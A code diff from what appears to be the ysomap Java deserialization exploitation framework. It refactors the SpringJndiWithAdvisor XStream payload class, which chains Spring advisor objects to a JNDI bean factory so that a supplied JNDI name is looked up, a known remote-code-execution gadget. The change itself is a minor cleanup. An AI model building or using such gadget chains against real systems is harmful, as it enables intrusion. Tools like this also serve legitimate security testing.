@@ -6,6 +6,7 @@ import ysomap.bullets.Bullet;
 import ysomap.bullets.spring.SpringJndiBullet1;
 import ysomap.common.annotation.*;
 import ysomap.core.util.PayloadHelper;
+import ysomap.core.util.ReflectionHelper;
 
 /**
  * @author wh1t3P1g
@@ -26,18 +27,17 @@ public class SpringJndiWithAdvisor extends XStreamPayload<Object> {
 
     @Override
     public Bullet getDefaultBullet(Object... args) throws Exception {
-        Bullet bullet = new SpringJndiBullet1();
-        bullet.set("jndi",args[0]);
-        return bullet;
+        return SpringJndiBullet1.newInstance(args);
     }
 
     @Override
     public Object pack(Object obj) throws Exception {
+        String jndi = ReflectionHelper.get(bullet, "jndi");
         DefaultBeanFactoryPointcutAdvisor advisor1 = new DefaultBeanFactoryPointcutAdvisor();
-        advisor1.setAdviceBeanName(bullet.get("jndi"));
+        advisor1.setAdviceBeanName(jndi);
         advisor1.setBeanFactory((SimpleJndiBeanFactory)obj);
         DefaultBeanFactoryPointcutAdvisor advisor2 = new DefaultBeanFactoryPointcutAdvisor();
-        advisor2.setAdviceBeanName(bullet.get("jndi"));
+        advisor2.setAdviceBeanName(jndi);
         advisor2.setBeanFactory((SimpleJndiBeanFactory)obj);
 //        advisor.setAdviceBeanName(bullet.get("jndi"));
 //        advisor.setBeanFactory((SimpleJndiBeanFactory)obj);
